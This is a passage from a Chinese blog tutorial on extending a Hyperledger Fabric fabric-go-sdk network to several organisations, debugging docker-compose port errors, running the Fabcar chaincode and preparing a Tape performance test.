class="string">peer0.org2.example.com</span></span><br><span class="line">    <span class="comment"># These parameters should be set in coordination with the keepalive policy on the server,</span></span><br><span class="line">    <span class="comment"># as incompatible settings can result in closing of connection.</span></span><br><span class="line">    <span class="comment"># When duration of the &#x27;keep-alive-time&#x27; is set to 0 or less the keep alive client parameters are disabled</span></span><br><span class="line">    <span class="attr">keep-alive-time:</span> <span class="string">0s</span></span><br><span class="line">    <span class="attr">keep-alive-timeout:</span> <span class="string">20s</span></span><br><span class="line">    <span class="attr">keep-alive-permit:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">fail-fast:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># allow-insecure will be taken into consideration if address has no protocol defined, if true then grpc or else grpcs</span></span><br><span class="line">    <span class="attr">allow-insecure:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment">#grpcOptions:</span></span><br><span class="line">  <span class="comment">#  ssl-target-name-override: peer0.org2.example.com</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tlsCACerts:</span></span><br><span class="line">    <span class="comment"># Certificate location absolute path</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/home/baymrx/go/src/fabric-go-sdk/fixtures/crypto-config/peerOrganizations/org2.example.com/tlsca/tlsca.org2.example.com-cert.pem</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">peer1.org2.example.com:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">peer1.org2.example.com:10051</span></span><br><span class="line">  <span class="comment">#grpcOptions:</span></span><br><span class="line">  <span class="comment">#  ssl-target-name-override: peer0.org2.example.com</span></span><br><span class="line">  <span class="attr">grpcOptions:</span></span><br><span class="line">    <span class="attr">ssl-target-name-override:</span> <span class="string">peer1.org2.example.com</span></span><br><span class="line">    <span class="comment"># These parameters should be set in coordination with the keepalive policy on the server,</span></span><br><span class="line">    <span class="comment"># as incompatible settings can result in closing of connection.</span></span><br><span class="line">    <span class="comment"># When duration of the &#x27;keep-alive-time&#x27; is set to 0 or less the keep alive client parameters are disabled</span></span><br><span class="line">    <span class="attr">keep-alive-time:</span> <span class="string">0s</span></span><br><span class="line">    <span class="attr">keep-alive-timeout:</span> <span class="string">20s</span></span><br><span class="line">    <span class="attr">keep-alive-permit:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">fail-fast:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># allow-insecure will be taken into consideration if address has no protocol defined, if true then grpc or else grpcs</span></span><br><span class="line">    <span class="attr">allow-insecure:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tlsCACerts:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/home/baymrx/go/src/fabric-go-sdk/fixtures/crypto-config/peerOrganizations/org2.example.com/tlsca/tlsca.org2.example.com-cert.pem</span></span><br></pre></td></tr></table></figure><p><strong>4、在entityMatchers-peer中添加org2</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">(\w+).org2.example.com:(\d+)</span></span><br><span class="line">  <span class="attr">urlSubstitutionExp:</span> <span class="string">$&#123;1&#125;.org2.example.com:$&#123;2&#125;</span></span><br><span class="line">  <span class="attr">sslTargetOverrideUrlSubstitutionExp:</span> <span class="string">$&#123;1&#125;.org2.example.com</span></span><br><span class="line">  <span class="attr">mappedHost:</span> <span class="string">peer0.org2.example.com</span></span><br></pre></td></tr></table></figure><h3 id="修改main-go">修改main.go</h3><p><strong>在main()的orgs变量中添加Org2</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">orgs := []*sdkInit.OrgInfo&#123;</span><br><span class="line">&#123;</span><br><span class="line">OrgAdminUser:  <span class="string">&quot;Admin&quot;</span>,</span><br><span class="line">OrgName:       <span class="string">&quot;Org1&quot;</span>,</span><br><span class="line">OrgMspId:      <span class="string">&quot;Org1MSP&quot;</span>,</span><br><span class="line">OrgUser:       <span class="string">&quot;User1&quot;</span>,</span><br><span class="line">OrgPeerNum:    <span class="number">2</span>,</span><br><span class="line">OrgAnchorFile: <span class="string">&quot;/home/baymrx/go/src/fabric-go-sdk/fixtures/channel-artifacts/Org1MSPanchors.tx&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">OrgAdminUser:  <span class="string">&quot;Admin&quot;</span>,</span><br><span class="line">OrgName:       <span class="string">&quot;Org2&quot;</span>,</span><br><span class="line">OrgMspId:      <span class="string">&quot;Org2MSP&quot;</span>,</span><br><span class="line">OrgUser:       <span class="string">&quot;User1&quot;</span>,</span><br><span class="line">OrgPeerNum:    <span class="number">2</span>,</span><br><span class="line">OrgAnchorFile: <span class="string">&quot;/home/baymrx/go/src/fabric-go-sdk/fixtures/channel-artifacts/Org2MSPanchors.tx&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="启动Docker并运行代码">启动Docker并运行代码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd fixtures &amp;&amp; docker-compose up -d &amp;&amp; cd ..</span><br><span class="line">go build</span><br><span class="line">./fabric-go-sdk</span><br></pre></td></tr></table></figure><p>报错了o(╯□╰)o</p><blockquote><p>&gt;&gt; 加入通道…<br>&gt;&gt; Create channel and join error: Org1 peers failed to JoinChannel: join channel failed: Multiple errors occurred: - SendProposal failed: Transaction processing for endorser [<a href="http://peer1.org1.example.com:8051">peer1.org1.example.com:8051</a>]: Endorser Client Status Code: (2) CONNECTION_FAILED. Description: dialing connection on target [<a href="http://peer1.org1.example.com:8051">peer1.org1.example.com:8051</a>]: connection is in TRANSIENT_FAILURE - SendProposal failed: Transaction processing for endorser [<a href="http://peer0.org1.example.com:7051">peer0.org1.example.com:7051</a>]: Endorser Client Status Code: (2) CONNECTION_FAILED. Description: dialing connection on target [<a href="http://peer0.org1.example.com:7051">peer0.org1.example.com:7051</a>]: connection is in TRANSIENT_FAILURE</p></blockquote><p>执行<code>docker ps -a</code>查看容器的运行状态，其中所有的peer节点状态都为<code>Exited (2)</code></p><p>那么找到其中一个peer节点容器的ID（<a href="http://xn--peer0-1l6jtyd3udw3b264c3qe.org1.example.com">我这里找的是peer0.org1.example.com</a>，对应ID为39c5829f2a4f），查看其日志<code>docker logs 39c</code></p><p>日志中显示couchDB报错：</p><blockquote><p>2022-08-01 06:27:51.842 UTC 0046 DEBU [couchdb] verifyCouchConfig -&gt; Exiting VerifyCouchConfig()<br>panic: Error in instantiating ledger provider: Get “<a href="http://couchdb0:7984/">http://couchdb0:7984/</a>”: dial tcp 172.21.0.2:7984: connect: connection refused<br>http error calling couchdb</p></blockquote><p>根据报错信息发现原因是找不到<code>couchdb0:7984</code>这个地址，一番检索后发现是因为我之前在修改docker-compose.yaml时，将<code>CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS</code>所对应的端口都改为了couchDB容器的外部端口，而这种方式搭建的Docker环境由于networks参数的存在，会将所有的容器都放到同一个网络中，访问时使用容器名即可。所以这里的<strong>解决方法</strong>是将所有的<code>CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS</code>的端口都改为5984</p><p>那么调整完成之后，重启环境再来运行一遍</p><p>Oops！又报错了，这次换了个报错信息</p><blockquote><p>&gt;&gt; 组织认可智能合约定义…<br>&gt;&gt;&gt; chaincode approved by Org1 peers:<br><a href="http://peer0.org1.example.com:7051">peer0.org1.example.com:7051</a><br><a href="http://peer1.org1.example.com:8051">peer1.org1.example.com:8051</a><br>&gt;&gt;&gt; chaincode approved by Org2 peers:<br><a href="http://peer0.org2.example.com:9051">peer0.org2.example.com:9051</a><br><a href="http://peer1.org2.example.com:10051">peer1.org2.example.com:10051</a><br>[fabsdk/fab] 2022/08/01 07:22:35 UTC - dispatcher.(*Dispatcher).HandleConnectEvent -&gt; WARN error creating connection: could not connect to <a href="http://peer1.org2.example.com:7051">peer1.org2.example.com:7051</a>: dialing connection on target [<a href="http://peer1.org2.example.com:7051">peer1.org2.example.com:7051</a>]: connection is in TRANSIENT_FAILURE</p></blockquote><p>&gt;&gt; create chaincode lifecycle error: %v queryApprovedCC error: Org Org2 Peer <a href="http://peer0.org2.example.com:9051">peer0.org2.example.com:9051</a> NewInvoker error: Test status Code: (12) UNKNOWN. Description: LifecycleQueryApprovedCC returned error: querying for installed chaincode failed: Transaction processing for endorser [<a href="http://peer0.org2.example.com:9051">peer0.org2.example.com:9051</a>]: Chaincode status Code: (500) UNKNOWN. Description: failed to invoke backing implementation of ‘QueryApprovedChaincodeDefinition’: could not fetch approved chaincode definition (name: ‘simplecc’, sequence: ‘1’) on channel ‘mychannel’</p><p>从报错信息来看是由于连不上peer节点造成的，由于之前将所有节点<code>environment</code>参数中变量的端口全部改为70xx，只在端口参数处进行映射，参考上一个报错，一部分网络连接走Docker内网络一部分走Docker外网络，造成端口不一致。**修改方案：**修改docker-compose.yaml文件，将environment参数下的所有端口都改为对应节点所分配的端口（而不是统一的70xx）</p><p>修改完后，再次重启环境运行fabric-go-sdk，这次可以完美运行~</p><blockquote><p>总结一下，遇到类似上面两种报错信息，多检查一下docker-compose.yaml这类配置文件是否正确，特别是端口号、组织号这些</p></blockquote><h2 id="fabric-go-sdk-1-orderer-3-orgs-2-peers">fabric-go-sdk(1 orderer, 3 orgs, 2 peers)</h2><h3 id="修改配置文件-2">修改配置文件</h3><p>与上个章节2个组织的配置修改过程基本相同，其他不同的地方单独记录</p><p><strong>1、<code>configtx.yaml</code>中的Application-Policies的LifecycleEndorsement和Endorsement需要将Org3添加进去</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">LifecycleEndorsement:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">Signature</span></span><br><span class="line">    <span class="attr">Rule:</span> <span class="string">&quot;OR(&#x27;Org1MSP.member&#x27;,&#x27;Org2MSP.member&#x27;,&#x27;Org3MSP.member&#x27;)&quot;</span></span><br><span class="line"><span class="attr">Endorsement:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">Signature</span></span><br><span class="line">    <span class="attr">Rule:</span> <span class="string">&quot;OR(&#x27;Org1MSP.member&#x27;,&#x27;Org2MSP.member&#x27;,&#x27;Org3MSP.member&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><strong>2、<code>create.sh</code>中追加一行Org3的命令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../fabric-samples/bin/configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org3MSPanchors.tx -channelID mychannel -asOrg Org3MSP</span><br></pre></td></tr></table></figure><blockquote><p>这里的<code>TwoOrgsChannel</code>是否修改为Three并不重要，只要它与<code>configtx.yaml</code>中Profiles指定的参数相对应即可</p></blockquote><h3 id="运行Fabric">运行Fabric</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd fixtures &amp;&amp; docker-compose up -d &amp;&amp; cd ..</span><br><span class="line">go build</span><br><span class="line">./fabric-go-sdk</span><br></pre></td></tr></table></figure><p>代码可以正常跑完，没有问题</p><h2 id="Fabcar-on-fabric-go-sdk-1-orderer-3-orgs-2-peers">Fabcar on fabric-go-sdk(1 orderer, 3 orgs, 2 peers)</h2><p>组织和peer节点的创建都没有问题的话，换个链码再试一下，这里使用Fabric官方提供的Fabcar链码</p><h3 id="chaincode更改">chaincode更改</h3><p>将<code>fabric-samples/chaincode/fabcar/go/</code>目录下的所有文件拷贝到项目目录下的<code>chaincode</code>文件夹中，并清除文件夹中之前的所有文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ./chaincode/* &amp;&amp; cp ../fabric-samples/chaincode/fabcar/go/* ./chaincode</span><br></pre></td></tr></table></figure><p>在chaincode文件夹中生成链码的依赖文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd chaincode &amp;&amp; go mod vendor</span><br></pre></td></tr></table></figure><p>由于链码的初始化需要从<code>Init()</code>函数方法开始，但直接拷贝过来的<code>fabcar.go</code>中没有这一方法，这里曲线救国，直接将链码中的<code>InitLedger()</code>方法改为<code>Init()</code></p><p>如果链码中没有Init方法，可能发生如下错误：</p><blockquote><p>&gt;&gt; 调用智能合约初始化方法…<br>&gt;&gt; create chaincode lifecycle error: %v initCC error: Failed to init: Multiple errors occurred: - Transaction processing for endorser [<a href="http://peer0.org3.example.com:11051">peer0.org3.example.com:11051</a>]: Chaincode status Code: (500) UNKNOWN. Description: error in simulation: transaction returned with failure: Function init not found in contract SmartContract - Transaction processing for endorser [<a href="http://peer0.org2.example.com:9051">peer0.org2.example.com:9051</a>]: Chaincode status Code: (500) UNKNOWN. Description: error in simulation: transaction returned with failure: Function init not found in contract SmartContract - Transaction processing for endorser [<a href="http://peer1.org1.example.com:8051">peer1.org1.example.com:8051</a>]: Chaincode status Code: (500) UNKNOWN. Description: error in simulation: transaction returned with failure: Function init not found in contract SmartContract</p></blockquote><h3 id="main-go更改">main.go更改</h3><blockquote><p>修改后的文件可<a href="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/other/3orgs-fabcar_main.go">在此下载</a></p></blockquote><p>找到文件<code>fabric-samples/fabcar/go/fabcar.go</code>，将此文件内容与原先项目中的<code>main.go</code>进行合并，在原文件<code>设置链码状态完成</code>之后，将<code>fabcar.go</code>中的功能性代码添加进去，并修改文件依赖，除此之外，链码的名称也要进行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import (</span><br><span class="line">&quot;fabric-go-sdk/sdkInit&quot;</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;os&quot;</span><br><span class="line">&quot;errors&quot;</span><br><span class="line">&quot;io/ioutil&quot;</span><br><span class="line">&quot;path/filepath&quot;</span><br><span class="line"></span><br><span class="line">&quot;github.com/hyperledger/fabric-sdk-go/pkg/core/config&quot;</span><br><span class="line">&quot;github.com/hyperledger/fabric-sdk-go/pkg/gateway&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">cc_name    = &quot;fabcar&quot;</span><br><span class="line">cc_version = &quot;1.0.0&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>其中还有三个路径变量<code>ccpPath</code>、<code>credPath</code>和<code>certPath</code>需要修改，否则可能会报如下错误：</p><blockquote><p>Failed to populate wallet contents: open …/…/test-network/organizations/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp/signcerts/cert.pem: no such file or directory</p></blockquote><p>三个路径变量的内容分别为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ccpPath := filepath.Join(</span><br><span class="line">&quot;fixtures&quot;,</span><br><span class="line">&quot;crypto-config&quot;,</span><br><span class="line">&quot;peerOrganizations&quot;,</span><br><span class="line">&quot;org1.example.com&quot;,</span><br><span class="line">&quot;connection-org1.yaml&quot;,</span><br><span class="line">)</span><br><span class="line">#下面两个变量在populateWallet函数中</span><br><span class="line">credPath := filepath.Join(</span><br><span class="line">&quot;fixtures&quot;,</span><br><span class="line">&quot;crypto-config&quot;,</span><br><span class="line">&quot;peerOrganizations&quot;,</span><br><span class="line">&quot;org1.example.com&quot;,</span><br><span class="line">&quot;users&quot;,</span><br><span class="line">&quot;User1@org1.example.com&quot;,</span><br><span class="line">&quot;msp&quot;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">certPath := filepath.Join(credPath, &quot;signcerts&quot;, &quot;User1@org1.example.com-cert.pem&quot;)</span><br></pre></td></tr></table></figure><p><code>ccpPath</code>中的<code>connection-org1.yaml</code>在之前的配置操作中并没有生成，需要使用脚本手动添加</p><p>添加过程如下：</p><p>1、将ccp模板文件拷贝到项目目录中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ../fabric-samples/test-network/organizations/ccp-template.yaml ./fixtures</span><br></pre></td></tr></table></figure><p>2、将ccp脚本文件拷贝到项目目录中（或者直接进入第3步创建<code>ccp-generate.sh</code>文件并授予可执行权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ../fabric-samples/test-network/organizations/ccp-generate.sh ./fixtures</span><br></pre></td></tr></table></figure><p>3、修改脚本文件，文件内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> one_line_pem &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;`awk &#x27;NF &#123;sub(/\\n/, &quot;</span><span class="string">&quot;); printf &quot;</span>%s\\\\\\\n<span class="string">&quot;,<span class="variable">$0</span>;&#125;&#x27; <span class="variable">$1</span>`&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> yaml_ccp &#123;</span><br><span class="line">    <span class="built_in">local</span> PP=$(one_line_pem <span class="variable">$4</span>)</span><br><span class="line">    <span class="built_in">local</span> CP=$(one_line_pem <span class="variable">$5</span>)</span><br><span class="line">    sed -e <span class="string">&quot;s/\$&#123;ORG&#125;/<span class="variable">$1</span>/&quot;</span> \</span><br><span class="line">        -e <span class="string">&quot;s/\$&#123;P0PORT&#125;/<span class="variable">$2</span>/&quot;</span> \</span><br><span class="line">        -e <span class="string">&quot;s/\$&#123;CAPORT&#125;/<span class="variable">$3</span>/&quot;</span> \</span><br><span class="line">        -e <span class="string">&quot;s#\$&#123;PEERPEM&#125;#<span class="variable">$PP</span>#&quot;</span> \</span><br><span class="line">        -e <span class="string">&quot;s#\$&#123;CAPEM&#125;#<span class="variable">$CP</span>#&quot;</span> \</span><br><span class="line">        ./ccp-template.yaml | sed -e $<span class="string">&#x27;s/\\\\n/\\\n          /g&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ORG=1</span><br><span class="line">P0PORT=7051</span><br><span class="line">CAPORT=7054</span><br><span class="line">PEERPEM=crypto-config/peerOrganizations/org1.example.com/tlsca/tlsca.org1.example.com-cert.pem</span><br><span class="line">CAPEM=crypto-config/peerOrganizations/org1.example.com/ca/ca.org1.example.com-cert.pem</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(yaml_ccp $ORG $P0PORT $CAPORT $PEERPEM $CAPEM)</span>&quot;</span> &gt; crypto-config/peerOrganizations/org1.example.com/connection-org1.yaml</span><br><span class="line"></span><br><span class="line">ORG=2</span><br><span class="line">P0PORT=9051</span><br><span class="line">CAPORT=9054</span><br><span class="line">PEERPEM=crypto-config/peerOrganizations/org2.example.com/tlsca/tlsca.org2.example.com-cert.pem</span><br><span class="line">CAPEM=crypto-config/peerOrganizations/org2.example.com/ca/ca.org2.example.com-cert.pem</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(yaml_ccp $ORG $P0PORT $CAPORT $PEERPEM $CAPEM)</span>&quot;</span> &gt; crypto-config/peerOrganizations/org2.example.com/connection-org2.yaml</span><br><span class="line"></span><br><span class="line">ORG=3</span><br><span class="line">P0PORT=11051</span><br><span class="line">CAPORT=11054</span><br><span class="line">PEERPEM=crypto-config/peerOrganizations/org3.example.com/tlsca/tlsca.org3.example.com-cert.pem</span><br><span class="line">CAPEM=crypto-config/peerOrganizations/org3.example.com/ca/ca.org3.example.com-cert.pem</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(yaml_ccp $ORG $P0PORT $CAPORT $PEERPEM $CAPEM)</span>&quot;</span> &gt; crypto-config/peerOrganizations/org3.example.com/connection-org3.yaml</span><br></pre></td></tr></table></figure><p>4、进入到<code>fixtures</code>目录执行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ccp-generate.sh</span><br></pre></td></tr></table></figure><h3 id="对go文件编译运行">对go文件编译运行</h3><p>在项目根目录中执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go mod init</span><br><span class="line">go mod tidy</span><br><span class="line">go build</span><br><span class="line">./fabric-go-sdk</span><br></pre></td></tr></table></figure><p>在执行<code>go build</code>构建可执行文件时，可能会报错</p><blockquote><p># <a href="http://github.com/hyperledger/fabric-sdk-go/internal/github.com/hyperledger/fabric/discovery/client">github.com/hyperledger/fabric-sdk-go/internal/github.com/hyperledger/fabric/discovery/client</a><br>…/…/pkg/mod/github.com/hyperledger/fabric-sdk-go@v1.0.0/internal/github.com/hyperledger/fabric/discovery/client/api.go:47:38: undefined: discovery.ChaincodeCall<br>…/…/pkg/mod/github.com/hyperledger/fabric-sdk-go@v1.0.0/internal/github.com/hyperledger/fabric/discovery/client/client.go:83:63: undefined: discovery.ChaincodeInterest<br>…/…/pkg/mod/github.com/hyperledger/fabric-sdk-go@v1.0.0/internal/github.com/hyperledger/fabric/discovery/client/client.go:120:65: undefined: discovery.ChaincodeCall<br>…/…/pkg/mod/github.com/hyperledger/fabric-sdk-go@v1.0.0/internal/github.com/hyperledger/fabric/discovery/client/client.go:124:23: undefined: discovery.ChaincodeInterest<br>…/…/pkg/mod/github.com/hyperledger/fabric-sdk-go@v1.0.0/internal/github.com/hyperledger/fabric/discovery/client/client.go:229:105: undefined: discovery.ChaincodeCall<br>…/…/pkg/mod/github.com/hyperledger/fabric-sdk-go@v1.0.0/internal/github.com/hyperledger/fabric/discovery/client/client.go:247:64: undefined: discovery.ChaincodeCall<br>…/…/pkg/mod/github.com/hyperledger/fabric-sdk-go@v1.0.0/internal/github.com/hyperledger/fabric/discovery/client/client.go:604:48: undefined: discovery.ChaincodeInterest<br>…/…/pkg/mod/github.com/hyperledger/fabric-sdk-go@v1.0.0/internal/github.com/hyperledger/fabric/discovery/client/client.go:620:35: undefined: discovery.ChaincodeCall</p></blockquote><p>这种问题是由于依赖<code>fabric-protos-go</code>在最新版本中删掉了ChaincodeCall和ChaincodeInterest，将<code>go.mod</code>中的<code>fabric-protos-go</code>改为较早版本即可解决（我这里使用的是v0.0.0-20210318103044-13fdee960194，改为此版本或更早版本就行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require (</span><br><span class="line">github.com/hyperledger/fabric-protos-go v0.0.0-20210318103044-13fdee960194</span><br><span class="line">github.com/hyperledger/fabric-sdk-go v1.0.0</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>修改完保存后，重新执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go mod tidy</span><br><span class="line">go build</span><br><span class="line">./fabric-go-sdk</span><br></pre></td></tr></table></figure><p>如果在运行的时候报如下错误：</p><blockquote><p>&gt;&gt; 设置链码状态完成<br>[fabsdk/fab] 2022/08/07 11:53:33 UTC - peer.(*peerEndorser).sendProposal -&gt; ERRO process proposal failed [rpc error: code = Unknown desc = error validating proposal: access denied: channel [mychannel] creator org unknown, creator is malformed]<br>Failed to get network: Failed to create new channel client: event service creation failed: could not get chConfig cache reference: QueryBlockConfig failed: QueryBlockConfig failed: queryChaincode failed: Transaction processing for endorser [localhost:7051]: gRPC Transport Status Code: (2) Unknown. Description: error validating proposal: access denied: channel [mychannel] creator org unknown, creator is malformed</p></blockquote><p>通常是因为fabcar生成了<code>wallet</code>，在钱包中会使用到证书的公私钥文件，如果有重新生成过crypto-config文件夹，而没有删除根目录生成的walle，则会报此类错误。**解决方案：**删除项目根目录的wallet文件夹后再重新运行程序</p><p>如果运行时遇到下面几类报错，比较玄学，暂时不知道原因，多试几次，可能就行了。</p><blockquote><p>[fabsdk/fab] 2022/08/01 12:15:58 UTC - dispatcher.(*Dispatcher).HandleConnectEvent -&gt; WARN error creating connection: could not connect to localhost:8051: dialing connection on target [localhost:8051]: connection is in TRANSIENT_FAILURE<br>Failed to submit transaction: Failed to submit: error registering for TxStatus event: could not create client conn: could not connect to localhost:8051: dialing connection on target [localhost:8051]: connection is in TRANSIENT_FAILURE</p></blockquote><blockquote><p>&gt;&gt; 设置链码状态完成<br>Failed to evaluate transaction: Failed to evaluate: Multiple errors occurred: - Transaction processing for endorser [localhost:7051]: Chaincode status Code: (500) UNKNOWN. Description: error in simulation: failed to execute transaction 3639c35486a66b66c34667fde1e975d4cc07b3cbdc353d1cb7e1f5c7a319a780: invalid invocation: chaincode ‘fabcar’ has not been initialized for this version, must call as init first - Transaction processing for endorser [localhost:9051]: Chaincode status Code: (500) UNKNOWN. Description: error in simulation: failed to execute transaction 3639c35486a66b66c34667fde1e975d4cc07b3cbdc353d1cb7e1f5c7a319a780: invalid invocation: chaincode ‘fabcar’ has not been initialized for this version, must call as init first</p></blockquote><h2 id="Tape性能测试">Tape性能测试</h2><h3 id="部署">部署</h3><p>部署过程参考<a href="https://github.com/Hyperledger-TWGC/tape/blob/master/docs/zh/gettingstarted.md">官方文档</a>，我这里采用克隆仓库本地编译的形式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Hyperledger-TWGC/tape.git &amp;&amp; cd tape &amp;&amp; make t</span><br><span class="line">ape</span><br></pre></td></tr></table></figure><p>然后需要在tape目录下修改<code>config.yaml</code>文件</p><ol><li>修改证书和私钥文件的路径，将<code>./organizations</code>改为<code>../fixtures/crypto-config</code>，与文件实际路径相对应即可</li><li>添加策略文件<code>policyFile: ./test/andLogic.rego</code>，否则可能会报错<code>empty endorsement policy%</code></li><li>修改客户端执行参数，这里只保留一个参数，使用<code>- queryAllCars</code>进行测试</li><li>完善peer和orderer节点的配置，完整config<a href="https://github.com/Hyperledger-TWGC/tape/blob/master/docs/configfile.md">样例参考</a>，若报错<code>rpc error: code = Unavailable desc = closing transport due to: connection error: desc = &quot;error reading from server: EOF&quot;, received prior goaway: code: ENHANCE_YOUR_CALM, debug data: &quot;too_many_pings&quot;%</code>则需要完善此配置</li></ol><p>修改后的<code>config.yaml</code>文件如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 